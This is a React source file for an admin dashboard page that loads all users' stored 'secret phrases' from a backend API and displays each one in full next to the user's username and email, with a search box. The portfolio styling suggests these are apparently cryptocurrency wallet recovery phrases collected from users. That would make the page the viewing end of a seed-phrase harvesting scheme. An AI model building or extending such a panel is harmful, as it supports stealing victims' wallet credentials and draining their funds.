import React, { useState, useEffect, useMemo } from 'react';
import './Portfolios.css'; // Re-using the same styles as Portfolios page

const SecretPhraseCard = ({ phrase }) => {
  return (
    <div className="portfolio-card">
      <div className="card-header">
        <h5 className="card-user-name">{phrase.user.username}</h5>
        <p className="card-user-email">{phrase.user.email}</p>
      </div>
      <div className="card-body">
        <div className="portfolio-summary" style={{ textAlign: 'center', width: '100%' }}>
          <p className="total-value-label">Secret Phrase Name</p>
          <h3 className="total-value" style={{ color: '#00e1ff', wordBreak: 'break-all' }}>{phrase.name}</h3>
          <p className="total-value-label" style={{ marginTop: '15px' }}>Secret Phrase</p>
          <p className="card-user-email" style={{ wordBreak: 'break-all', marginTop: '5px' }}>
            {phrase.phrase}
          </p>
        </div>
      </div>
    </div>
  );
};

const SecretPhrases = () => {
  const [phrases, setPhrases] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const apiUrl = import.meta.env.VITE_API_URL;
  const token = localStorage.getItem('token');

  useEffect(() => {
    const fetchAllSecretPhrases = async () => {
      try {
        setLoading(true);
        const res = await fetch(`${apiUrl}/secretphrases`, {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        if (!res.ok) throw new Error('Failed to fetch secret phrases.');
        const data = await res.json(); // The backend now returns an array directly
        setPhrases(data);
      } catch (err) {
        setError('Failed to load secret phrase data. Please try again.');
      } finally {
        setLoading(false);
      }
    };
    fetchAllSecretPhrases();
  }, []);

  const filteredPhrases = useMemo(() => {
    return phrases.filter(p =>
      p.user && (p.user.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
      p.user.email.toLowerCase().includes(searchTerm.toLowerCase()))
    );
  }, [phrases, searchTerm]);

  if (loading) return <div className="text-white text-center p-5">Loading Secret Phrases...</div>;
  if (error) return <div className="text-danger text-center p-5">{error}</div>;

  return (
    <div className="portfolios-page">
      <h1 className="dashboard-title">User Secret Phrases</h1>
      <div className="filters-bar">
        <input
          type="text"
          placeholder="Search by username or email..."
          className="search-input"
          value={searchTerm}
          onChange={e => setSearchTerm(e.target.value)}
        />
      </div>
      <div className="portfolio-grid">
        {filteredPhrases.length > 0 ? (
          filteredPhrases.map(phrase => (
            <SecretPhraseCard key={phrase._id} phrase={phrase} />
          ))
        ) : (
          <div className="no-results-message">
            <p>No secret phrases found.</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default SecretPhrases;